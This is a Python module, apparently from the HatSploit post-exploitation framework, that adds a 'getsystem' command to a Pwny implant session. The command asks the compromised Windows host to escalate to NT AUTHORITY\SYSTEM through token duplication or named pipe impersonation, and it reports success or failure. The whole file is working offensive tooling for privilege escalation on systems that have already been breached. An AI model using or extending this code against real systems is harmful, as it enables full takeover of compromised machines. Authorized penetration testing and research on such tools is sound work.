"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

GETSYSTEM_BASE = 15

GETSYSTEM_ELEVATE = tlv_custom_tag(API_CALL_STATIC, GETSYSTEM_BASE, API_CALL)

TLV_TYPE_GETSYS_TECHNIQUE = tlv_custom_type(TLV_TYPE_INT, GETSYSTEM_BASE, API_TYPE)

GETSYS_TECHNIQUE_TOKEN = 0
GETSYS_TECHNIQUE_PIPE = 1


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "escalate",
            'Name': "getsystem",
            'Authors': [
                'EntySec - command developer',
            ],
            'Description': "Attempt to elevate to NT AUTHORITY\\SYSTEM.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-t', '--technique'),
                    {
                        'help': "Technique: 0=Token duplication (default), 1=Named pipe.",
                        'metavar': 'NUM',
                        'type': int,
                        'default': 0,
                    }
                ),
            ]
        })

    def run(self, args):
        technique = args.technique

        technique_names = {
            GETSYS_TECHNIQUE_TOKEN: "Token Duplication",
            GETSYS_TECHNIQUE_PIPE: "Named Pipe Impersonation",
        }

        self.print_process(
            f"Attempting privilege escalation via "
            f"{technique_names.get(technique, 'Unknown')}..."
        )

        result = self.session.send_command(
            tag=GETSYSTEM_ELEVATE,
            args={
                TLV_TYPE_GETSYS_TECHNIQUE: technique,
            }
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error(
                "Failed to elevate privileges! "
                "Requires admin context or SeDebugPrivilege/SeImpersonatePrivilege."
            )
            return

        self.print_success("Got SYSTEM!")
